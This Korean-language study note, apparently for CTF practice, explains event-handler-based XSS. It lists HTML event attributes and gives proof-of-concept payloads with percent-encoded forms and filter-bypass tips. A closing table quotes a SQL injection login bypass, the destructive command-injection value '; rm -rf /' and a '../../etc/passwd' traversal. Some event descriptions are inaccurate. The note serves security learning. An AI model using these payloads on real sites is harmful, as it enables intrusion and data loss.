## 🧨 이벤트 핸들러 기반 XSS

### 💡 개념 요약

브라우저는 특정 HTML 태그에 이벤트 속성이 있을 때 자동으로 JavaScript 코드를 실행합니다. 이를 악용하여 **이벤트 핸들러 기반 XSS** 공격이 가능합니다. 대표적인 이벤트 핸들러에는 `onerror`, `onload`, `onclick`, `onmouseover` 등이 있습니다.

#### 대표적인 이벤트 핸들러:

| 이벤트             | 설명                                                  |
| --------------- | --------------------------------------------------- |
| `onerror`       | 이미지나 리소스 로드 실패 시 실행                                 |
| `onload`        | 리소스 로드 완료 시 실행                                      |
| `onclick`       | 클릭 시 실행                                             |
| `onmouseover`   | 마우스 오버 시 실행                                         |
| `onstop`        | `media` 요소에서 재생 중지 시 실행 (예: `<video>`)              |
| `ontoggle`      | `<details>` 태그의 열림/닫힘 상태가 변경될 때 실행                  |
| `onresize`      | 윈도우나 요소의 크기가 변경될 때 실행                               |
| `onfocusin`     | 요소에 포커스가 들어갈 때 실행 (버블링 발생)                          |
| `onfocus`       | 요소에 포커스가 들어갈 때 실행                                   |
| `onabort`       | 리소스 로드가 중단될 때 실행                                    |
| `ondblclick`    | 더블 클릭 시 실행                                          |
| `ondragstart`   | 드래그 시작 시 실행                                         |
| `ondragenter`   | 드래그된 요소가 드롭 가능한 영역에 들어올 때 실행                        |
| `ondragleave`   | 드래그된 요소가 드롭 가능한 영역을 떠날 때 실행                         |
| `onkeydown`     | 키를 누를 때 실행                                          |
| `onselectstart` | 텍스트 선택이 시작될 때 실행                                    |
| `onselect`      | 텍스트가 선택될 때 실행                                       |
| `onmousemove`   | 마우스가 요소 내에서 움직일 때 실행                                |
| `onmouseout`    | 마우스가 요소 밖으로 나갈 때 실행                                 |
| `onwheel`       | 마우스 휠을 굴릴 때 실행                                      |
| `onkeypress`    | 키를 누를 때 실행 (deprecated, `keydown` 또는 `keyup` 사용 권장) |
| `onload`        | 페이지 또는 리소스가 완전히 로드되었을 때 실행                          |
| `onunload`      | 페이지가 언로드될 때 실행                                      |
| `onbounce`      | 비디오나 오디오의 애니메이션이 바운스할 때 실행                          |
| `onreset`       | 폼이 리셋될 때 실행                                         |
| `onrowexit`     | HTML `<table>`의 행이 포커스를 잃을 때 실행                     |
| `ondeactivate`  | `<input>` 요소나 포커스를 잃을 때 실행                          |
| `onbeforecut`   | 텍스트를 자르기 전에 실행                                      |
| `onsubmit`      | 폼 제출 시 실행                                           |
| `onpaste`       | 텍스트가 붙여넣어질 때 실행                                     |
| `onchange`      | 폼 요소의 값이 변경될 때 실행                                   |

---

## 🔥 대표 페이로드 예제

### 1. `<img>` + `onerror` (가장 흔한 XSS)

```html
<img src=x onerror=alert(1)>
```

**퍼센트 인코딩**:

```
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

📌 `src=x`는 로드 실패를 유도하여 `onerror`가 실행됩니다.

---

### 2. `<svg>` + `onload` (강력한 스크립트 우회)

```html
<svg onload=alert(1)>
```

**퍼센트 인코딩**:

```
%3Csvg%20onload%3Dalert(1)%3E
```

📌 SVG는 `<script>` 태그가 필터링되어도 우회가 가능하며, 이미지처럼 삽입되기 때문에 필터를 우회하기 쉽습니다.

```html
"><svg/onload=alert(1)>
```

---

### 3. `<iframe>` + `onload`

```html
<iframe onload=alert(1)></iframe>
```

**퍼센트 인코딩**:

```
%3Ciframe%20onload%3Dalert(1)%3E%3C%2Fiframe%3E
```

📌 `<iframe>`은 CTF에서 자주 사용되지는 않지만, 페이지가 렌더링 될 때 실행될 수 있습니다.

---

### 4. `<body>` + `onload` (페이지 로드 시)

```html
<body onload=alert(1)>
```

**퍼센트 인코딩**:

```
%3Cbody%20onload%3Dalert(1)%3E
```

📌 페이지 전체에 삽입되는 경우가 아니라면 거의 작동하지 않지만, SSR 기반 CTF에서는 사용할 수 있습니다.

---

### 5. `<div>` + `onmouseover` (유저 상호작용 필요)

```html
<div onmouseover=alert(1)>XSS</div>
```

**퍼센트 인코딩**:

```
%3Cdiv%20onmouseover%3Dalert(1)%3EXSS%3C%2Fdiv%3E
```

📌 이 페이로드는 사용자가 `div` 요소 위에 마우스를 올리면 실행됩니다.

```html
<div onmouseover="alert(1)">Hover me</div>
```

---

### 6. `document.domain` XSS (도메인 확인용)

```html
<script>
  console.log(document.domain); // "example.com"
</script>
```

* 공격자가 `alert(document.domain)`을 삽입하는 이유는 **XSS 성공 여부를 확인**하려는 것입니다. 공격이 성공하면 페이지에서 현재 도메인(`example.com` 등)이 `alert`로 출력됩니다.

```javascript
// 구글에서 실행해보면
document.domain
// 출력: "google.com"
```

---

## ✅ 필터 우회 팁

| 기법            | 설명                                  |
| ------------- | ----------------------------------- |
| 이벤트 핸들러만 사용하기 | `<script>`가 필터링돼도 작동할 수 있음          |
| 퍼센트 인코딩       | `<` → `%3C`, `>` → `%3E`와 같은 인코딩 방법 |
| 속성값           | 속성 내 JavaScript 코드 삽입 가능            |

---

## ⚠️ `<` 차단만으로 막을 수 없는 대표적 공격 유형들

| 공격 종류                        | `<` 포함 여부 | 설명                              |
| ---------------------------- | --------- | ------------------------------- |
| **SQL Injection**            | ❌ 포함 안 됨  | 예: `' OR 1=1--` 같은 문자열로 로그인 우회  |
| **Command Injection**        | ❌         | 예: `; rm -rf /`                 |
| **Path Traversal**           | ❌         | 예: `../../etc/passwd`           |
| **HTTP Parameter Pollution** | ❌         | 예: `?id=123&id=456` 처럼 중복 파라미터  |
| **Header Injection**         | ❌         | 응답 헤더 조작 (`\r\n` 삽입)            |
| **JSON 기반 XSS**              | ✅ 또는 ❌    | JSON 응답에 JavaScript 형태로 값 삽입 가능 |

---
